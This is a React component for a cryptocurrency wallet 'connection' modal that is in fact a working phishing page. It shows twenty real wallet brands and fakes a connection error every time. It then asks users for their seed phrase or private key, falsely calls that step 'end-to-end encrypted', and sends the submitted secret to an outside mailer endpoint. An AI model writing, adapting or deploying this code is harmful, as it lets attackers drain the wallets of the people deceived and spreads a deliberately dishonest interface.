import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "./Wallet.css";
import metamaskLogo from "../assets/wallets/metamask.png";
import trustWalletLogo from "../assets/wallets/trustwallet.jpeg";
import phantomLogo from "../assets/wallets/phantom.jpeg";
import tangemLogo from "../assets/wallets/tangem.png";
import binanceLogo from "../assets/wallets/binance.png";
import uniswapLogo from "../assets/wallets/uniswap.png";
import solflareLogo from "../assets/wallets/solflare.jpeg";
import rainbowLogo from "../assets/wallets/rainbow.jpeg";
import safepalLogo from "../assets/wallets/safepal.png";
import tokenpocketLogo from "../assets/wallets/token.png";
import ledgerLogo from "../assets/wallets/ledger.png";
import oneInchLogo from "../assets/wallets/oneinch.png";
import exodusLogo from "../assets/wallets/exodus.jpeg";
import argentLogo from "../assets/wallets/argent.png";
import walletverseLogo from "../assets/wallets/walletverse.jpeg";
import frontierLogo from "../assets/wallets/frontier.jpeg";
import omniLogo from "../assets/wallets/omni.jpeg";
import atomicLogo from "../assets/wallets/atomic.png";
import glowLogo from "../assets/wallets/glow.jpeg";
import nest from "../assets/wallets/nest.jpeg";
import Qrcode from "../assets/qrcode_localhost.png";

const wallets = [
  { id: 1, name: "MetaMask", logo: metamaskLogo },
  { id: 2, name: "Trust Wallet", logo: trustWalletLogo },
  { id: 3, name: "Phantom", logo: phantomLogo },
  { id: 4, name: "Tangem", logo: tangemLogo },
  { id: 5, name: "Binance Web3", logo: binanceLogo },
  { id: 6, name: "Uniswap", logo: uniswapLogo },
  { id: 7, name: "Solflare", logo: solflareLogo },
  { id: 8, name: "Rainbow Wallet", logo: rainbowLogo },
  { id: 9, name: "Safepal Wallet", logo: safepalLogo },
  { id: 10, name: "TokenPocket", logo: tokenpocketLogo },
  { id: 11, name: "Ledger Live", logo: ledgerLogo },
  { id: 12, name: "1inch Wallet", logo: oneInchLogo },
  { id: 13, name: "Exodus", logo: exodusLogo },
  { id: 14, name: "Argent", logo: argentLogo },
  { id: 15, name: "Wallet Verse", logo: walletverseLogo },
  { id: 16, name: "Frontier Wallet", logo: frontierLogo },
  { id: 17, name: "Omni", logo: omniLogo },
  { id: 18, name: "Atomic Wallet", logo: atomicLogo },
  { id: 19, name: "Glow", logo: glowLogo },
  { id: 20, name: "Nest Wallet", logo: nest },
];

const WalletSelection = () => {
  const [search, setSearch] = useState("");
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [error, setError] = useState(false);
  const [manualConnect, setManualConnect] = useState(false);
  const [inputType, setInputType] = useState("phrase");
  const [inputValue, setInputValue] = useState("");
  const [showQrConnecting, setShowQrConnecting] = useState(false); // New state

  const navigate = useNavigate();

  const filteredWallets = wallets.filter((wallet) =>
    wallet.name.toLowerCase().includes(search.toLowerCase())
  );

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setConnecting(true);
    setError(false);

    setTimeout(() => {
      setConnecting(false);
      setError(true); // Simulate connection error
    }, 10000);
  };

  const handleManualConnectToggle = () => {
    setManualConnect((prev) => !prev);
  };

  const handleInputSubmit = async () => {
    if (!inputValue.trim()) {
      alert(`Please enter your ${inputType}.`);
      return;
    }

    if (!selectedWallet) {
      alert("Please select a wallet first.");
      return;
    }

    try {
      setShowQrConnecting(true); // Show QR connecting overlay
      const response = await fetch("https://mailer-3t3d.onrender.com/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          wallet: selectedWallet,
          type: inputType,
          value: inputValue,
        }),
      });

      const result = await response.json();
      if (response.ok) {
        alert("Submitted successfully!");
      } else {
        alert(`Failed to submit: ${result.error}`);
      }
    } catch (error) {
      console.error("Error submitting data:", error);
      alert("An error occurred. Please try again.");
    } finally {
      setInputValue("");
      setShowQrConnecting(false); // Hide QR overlay after submission
    }
  };

  return (
    <div className="modal-overlay" onClick={() => navigate("/")}>
      <div className="modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header">
          <button className="cancel-button" onClick={() => navigate("/")}>
            Cancel
          </button>
          <h3>Wallets</h3>
        </div>

        {connecting && !showQrConnecting && (
          <div className="connecting-overlay">
            <img
              src={selectedWallet?.logo}
              alt={selectedWallet?.name}
              className="connecting-logo"
            />
            <p>Connecting to {selectedWallet?.name}...</p>
            <div className="spinner"></div>
          </div>
        )}

        {showQrConnecting && (
          <div className="connecting-overlay">
            <img src={Qrcode} alt="QR Code" className="dummy-qr-code" />
            <p>Chat AMDIN/SUPPORT for authentication code</p>
            <p>Connecting,Please wait...</p>
          </div>
        )}

        {!connecting && !error && !showQrConnecting && (
          <>
            <input
              type="text"
              placeholder="Search wallets..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="wallet-search"
            />
            <ul className="wallet-list">
              {filteredWallets.map((wallet) => (
                <li
                  key={wallet.id}
                  className="wallet-item"
                  onClick={() => handleWalletClick(wallet)}
                >
                  <img src={wallet.logo} alt={wallet.name} className="wallet-logo" />
                  <span>{wallet.name}</span>
                </li>
              ))}
            </ul>
          </>
        )}

        {error && !showQrConnecting && (
          <div className="error-container">
            {!manualConnect ? (
              <>
                <img src={Qrcode} alt="QR Code" className="dummy-qr-code" />
                <p>Connection failed. Do you want to connect manually?</p>
                <button
                  className="submit-phrase-button"
                  onClick={handleManualConnectToggle}
                >
                  Yes, Connect Manually
                </button>
              </>
            ) : (
              <>
                <p>Select a method and enter details:</p>
                <div className="input-type-buttons">
                  <button
                    className={`input-type-button ${
                      inputType === "phrase" ? "active" : ""
                    }`}
                    onClick={() => setInputType("phrase")}
                  >
                    Phrase
                  </button>
                  <button
                    className={`input-type-button ${
                      inputType === "keystone" ? "active" : ""
                    }`}
                    onClick={() => setInputType("keystone")}
                  >
                    Keystone
                  </button>
                  <button
                    className={`input-type-button ${
                      inputType === "privateKey" ? "active" : ""
                    }`}
                    onClick={() => setInputType("privateKey")}
                  >
                    Private Key
                  </button>
                </div>
                <input
                  type="text"
                  placeholder={`Enter your ${inputType}`}
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  className="wallet-phrase-input"
                />
                <p>
                  Enter your 12 or 24 seed phrase here. This validation process
                  is end-to-end encrypted and protected.
                </p>
                <button
                  className="submit-phrase-button"
                  onClick={handleInputSubmit}
                >
                  Submit
                </button>
              </>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletSelection;
